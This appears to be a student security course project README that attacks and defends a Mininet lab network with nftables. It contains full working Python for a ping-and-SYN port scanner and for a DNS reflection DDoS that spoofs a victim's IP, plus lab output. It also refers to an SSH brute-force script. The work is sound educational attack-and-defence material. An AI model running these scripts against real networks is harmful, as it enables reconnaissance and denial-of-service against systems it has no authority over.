# LINFO2347 Project Network Attacks 2023-2024

### Names: Dave Pikop, Anton Romanova 

## Project Overview

## Table of Contents
- [Project Overview](#project-overview)
- [Basic enterprise network protection](#Basic-enterprise-network-protection)
- [Network Attacks](#network-attacks)
- [Network Protection](#network-protection)
- [Launch topology attacks and protection](#Launch-topology-attacks-and-protection)

## Basic network protection
In the new version of the network, we have implemented a basic firewall using nftables. 
The configuration script is located in the `topo-default.sh` file."

To run the new configuration, execute the following command:

```sudo -E python3 ~/LINFO2347/topo-default.py```

### Test the Firewall

Our `nftables` firewall configuration was tested using the `pingall` command, yielding the following results:

```text
dns -> X X X X X X X X
ftp -> X X X X X X X X
http -> X X X X X X X X
internet -> dns ftp http ntp r1 r2 X X
ntp -> X X X X X X X X
r1 -> X X X internet X r2 ws2 ws3
r2 -> X X X internet X r1 X X
ws2 -> dns ftp http internet ntp r1 r2 ws3
ws3 -> dns ftp http internet ntp r1 r2 ws2
*** Results: 61% dropped (28/72 received)
```

## SSH/FTP Brute force

### attack

We performed a basic ssh bruteforce with `paramiko` and a 10k password 
list to which we added "mininet" on line 50 to avoid waiting too long

to run the attack from the internet, run
`internet python /home/mininet/LINFO2347/attacks/01_ssh_bruteforce.py`

The attack is performed in parallel with 7 threads. 

### mitigation

To mitigate brute-force attack we can simply rate-limit new connections
to 5 new connections per minute. If a client goes over this limit,
his ip address will be added to a blacklist for two minutes

```nftables
table inet dmz {
     # set of temporarily blocked ip
     set blocklist {
         type ipv4_addr
         timeout 2m      # expire ban after 2 minute
         size 65536
     }

     chain inbound {
         type filter hook input priority 0; policy accept;

         # Check if the source IP is in the blocklist
         ip saddr @blocklist drop

         # Rate limit incoming connections to SSH and FTP
         tcp dport { 22, 21 } ct state new counter packets 1 jump check_rate
     }

     chain check_rate {
         # General rate limit chain for specified ports
         ct state new limit rate over 5/minute burst 5 packets add @blocklist { ip saddr timeout 2m } drop
     }

     chain outbound {
         type filter hook output priority 0; policy drop;
         # Allow responses to established or related sessions
         ip daddr { 10.1.0.2, 10.1.0.3, 10.2.0.2 } ct state established,related accept
     }
 }
```

## Network scan

### attack

We will perform the Network Attack from the internet in 2 different phases:
1. We will scan the subnet (10.12.0.0/24) with ICMP requests (see ./attacks/02_network_scan.py)
2. We will mass-send SYN packets to every discovered host (aka any host that replied to ICMP echo request) on every single TCP port from 1 to 1000 and wait for replies

```python
import asyncio
import socket
import struct
import threading
from scapy.all import send, IP, ICMP, TCP, sniff
import ipaddress

responded_ips = []
open_ports = []

# MARK: - ICMP Scanner


stop_icmp_event = threading.Event()
stop_sniffing_event = threading.Event()


def receive_icmp():
    """ continuously listen for ICMP echo replies using raw sockets. """
    # we tried to use scapy to listen for ICMP packets, but it needs access to tcpdump...
    # so we are using raw sockets instead
    icmp = socket.getprotobyname('icmp')

    # https://docs.python.org/3/library/socket.html#socket.AF_INET
    # https://docs.python.org/3/library/socket.html#socket.SOCK_RAW
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)

    while not stop_icmp_event.is_set():
        packet, addr = sock.recvfrom(1024)
        ip_header = packet[:20]
        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)

        # extract ip version and header length
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        iph_length = ihl * 4

        icmp_header = packet[iph_length:iph_length+8]
        icmph = struct.unpack('!BBHHH', icmp_header)

        if icmph[0] == 0:  # icmp echo reply
            ip_responded = addr[0]
            if ip_responded not in responded_ips:
                responded_ips.append(ip_responded)
            print(f"Received ICMP reply from {ip_responded}")

    sock.close()

def start_icmp_listener():
    """ Starts a new thread that listens for ICMP packets. """
    thread = threading.Thread(target=receive_icmp)
    thread.daemon = True
    thread.start()
    return thread

async def icmp_scan(subnet):
    """ Asynchronously sends ICMP requests to a given subnet. """
    async def send_icmp_request(ip):
        packet = IP(dst=ip)/ICMP()
        send(packet, verbose=0)

    tasks = []

    for ip in ipaddress.ip_network(subnet).hosts():
        tasks.append(asyncio.create_task(send_icmp_request(str(ip))))

    await asyncio.gather(*tasks)


# MARK: - Port Scanner

def scapy_tcp_sniff():
    def process_packet(packet):
        if TCP in packet and (packet[TCP].flags & 0x12) == 0x12:
            print(f"Received SYN-ACK from {packet[IP].src} on port {packet[TCP].sport}")
            open_ports.append(packet[TCP].sport)
    sniff(
        prn=process_packet,
        filter="tcp",
      # store=0, count=0, 
        stop_filter=lambda _: stop_sniffing_event.is_set()
    )


def start_tcp_listener():
    """ Starts a new thread for listening to TCP responses. """
    thread = threading.Thread(target=scapy_tcp_sniff)
    thread.daemon = True
    thread.start()
    return thread


async def send_syn_packet(host: str, port: int):
    """ Asynchronously sends a SYN packet to a specific port on a host. """
    packet = IP(dst=host)/TCP(dport=port, flags="S")
    send(packet, verbose=0)

async def send_syn_packets(host: str, port_start: int, port_end: int):
    """ Sends SYN packets to a range of ports on a specified host concurrently. """
    print(f"Scanning ports {port_start}-{port_end} on {host}")
    tasks = []
    for port in range(port_start, port_end + 1):
        task = asyncio.create_task(send_syn_packet(host, port))
        tasks.append(task)
        if len(tasks) >= 250:
            await asyncio.gather(*tasks)
            tasks = []
    await asyncio.gather(*tasks)  # Ensure all remaining tasks are completed



async def main():
    subnet = "10.12.0.0/24"
    global responded_ips, open_ports
    stop_icmp_event.clear()
    thread = start_icmp_listener()
    await asyncio.sleep(0.2)
    await icmp_scan(subnet)
    # Stop the listener thread
    await asyncio.sleep(1)  # Wait for the listener to finish processing
    stop_icmp_event.set()
    thread.join()

    for ip in responded_ips:
        port_start, port_end = 1, 100
        stop_sniffing_event.clear()
        open_ports.clear()
        tcp_thread = start_tcp_listener()
        await send_syn_packets(ip, port_start, port_end)
        await asyncio.sleep(1)
        stop_sniffing_event.set()
        # there is now way to cleanly stop the sniffing thread in scapy without sending a packet
        dummy_packet = IP(dst=ip)/TCP(dport=port_start, flags="F")
        send(dummy_packet, verbose=0)
        tcp_thread.join()
        print(f"Open ports on the host {ip}: {open_ports}")


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
```


The following attack on the default network outputs this result:

```
Received ICMP reply from 10.12.0.1
Received ICMP reply from 10.12.0.2
Received ICMP reply from 10.12.0.10
Received ICMP reply from 10.12.0.20
Received ICMP reply from 10.12.0.30
Received ICMP reply from 10.12.0.40
Scanning ports 1-100 on 10.12.0.1
Open ports on the host 10.12.0.1: []
Scanning ports 1-100 on 10.12.0.2
Open ports on the host 10.12.0.2: []
Scanning ports 1-100 on 10.12.0.10
Received SYN-ACK from 10.12.0.10 on port 22
Received SYN-ACK from 10.12.0.10 on port 80
Open ports on the host 10.12.0.10: [22, 80]
Scanning ports 1-100 on 10.12.0.20
Open ports on the host 10.12.0.20: []
Scanning ports 1-100 on 10.12.0.30
Received SYN-ACK from 10.12.0.30 on port 22
Open ports on the host 10.12.0.30: [22]
Scanning ports 1-100 on 10.12.0.40
Received SYN-ACK from 10.12.0.40 on port 21
Received SYN-ACK from 10.12.0.40 on port 22
Open ports on the host 10.12.0.40: [21, 22]
```


We successfully performed a TCP network scan on every accessible host in the `10.12.0.0/24` subnet.
Doing this for UDP is more challenging wihtout specialized tools such as NMAP as UDP is stateless, and sending empty requests to some UDP servers doesn't guarantee a response even though the port is open.

### Mitigation

To mitigate network scanning, we implemented the same protectin as ssh bruteforce attack (ban the ip address sending a suspicious amount of suspicious packets for 2 minutes), as this attack is basically ICMP brute-forcing, and creatting a massive amount of new connections that is rarely justified for a single host in the real world. Of course if some service legitimately creates a lot of new TCP connections, we can create an exception for it with `nftables`.
```nftables
table inet r2 {
  set blocklist {
    type ipv4_addr
    timeout 2m      # expire ban after 2 minutes
    size 65536
  }

  chain forward {
    type filter hook forward priority 0; policy drop;

    # Check if source IP is in blocklist and drop if true
    ip saddr @blocklist drop;

    # Rate limiting ICMP requests from r2-eth0 to r2-eth12
    iif "r2-eth0" oif "r2-eth12" ip protocol icmp icmp type echo-request limit rate 120/minute burst 10 packets add @blocklist { ip saddr timeout 2m } drop;
    iif "r2-eth0" oif "r2-eth12" ip protocol tcp ct state new limit rate 50/minute burst 10 packets add @blocklist { ip saddr timeout 2m } drop;
    iif "r2-eth0" oif "r2-eth12" accept;

    # Allow responses from DMZ servers to the Internet or workstations
    iif "r2-eth12" oif "r2-eth0" ct state established,related accept;
  }
}
```


## Reflection attack

### attack

We proceeded with DDoS by DNS reflection attack. This attack consists of spooging attacker's IP address and sending a big amount of requests to one or multiple DNS servers on behalf of the victim.
This technique allows us to multiply the bandwidth of the attack to perform a more powerful attack with less bandwidth.
To perform this attack, we edited `dnsmasq.conf` to add a big number of TXT records to the domain name `this-is-the-rather-long-domain-name.example.com`. In this case there is only one DNS server, but we can suppose that the local enterprise 

In the beginning we also wanted to perform an [https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/](NTP reflection) attack, but for some reason (we didn't investigate any further onto why), the NTP server doesn't respond to `monlist` command. This command is probably just disabled. Other NTP commands don't allow to perform a significant amplification, so we just sticked with standard DNS reflection.

```python
from scapy.all import *
import threading
import time

domain = "this-is-the-rather-long-domain-name.example.com"
dns_server = "10.12.0.20"
port = 5353
target_server = "10.1.0.2" # ws2

dns_request = IP(dst=dns_server, src=target_server) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname=domain, qtype='TXT'))

def send_dns_request(end_time):
    while time.time() < end_time:
        response = send(dns_request, verbose=0, count=1000)

num_threads = 10
duration = 30  # Duration in seconds

end_time = time.time() + duration

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_dns_request, args=(end_time,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
```

The attack is performed during 30 seconds. We can observe that the attack uses up 3Gbit/s of bandwidth on average with one DNS server as reflector.

Normal performance:
```
mininet> iperf ws2 dns
*** Iperf: testing TCP bandwidth between ws2 and dns
*** Results: ['6.31 Gbits/sec', '6.32 Gbits/sec']
```

Bandwidth during DNS reflection attack
```
mininet> internet python /home/mininet/LINFO2347/attacks/03_ddos.py &
mininet> iperf ws2 dns
*** Iperf: testing TCP bandwidth between ws2 and dns
*** Results: ['3.26 Gbits/sec', '3.27 Gbits/sec']
```



